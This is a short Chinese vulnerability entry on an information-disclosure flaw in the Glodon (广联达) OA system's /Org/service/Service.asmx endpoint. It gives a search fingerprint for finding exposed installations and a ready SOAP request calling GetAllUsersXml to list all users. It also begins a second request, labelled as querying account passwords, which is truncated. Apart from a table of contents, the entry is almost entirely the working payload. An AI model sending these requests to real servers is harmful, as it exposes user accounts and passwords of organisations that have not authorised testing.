# 广联达OAService.asmx信息泄露漏洞

- **系统**：广联达OAService.asmx　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`app.name="广联达 OA"`
- **请求**：`POST /Org/service/Service.asmx HTTP/1.1`

**请求体 / payload**
```
隐患url
/Org/service/Service.asmx
查看所有用户
Host: xx.xx.xx.xx
Content-Type: application/soap+xml; charset=utf-8
Content-Length: length
<?xml version="1.0" encoding="utf-8"?>
<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
<soap12:Body>
<GetAllUsersXml xmlns="http://tempuri.org/" />
</soap12:Body>
</soap12:Envelope>
查询账户密码
POST /Org/service/Service.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: application/soap+xml; charset=utf-8
Content-Length: length
<?xml version="1.0" encodi…（脚本共 894 字，完整版见原文）
```

**其他**
- 广联达OA Service.asmx 信息泄露漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: + 广联达办公OA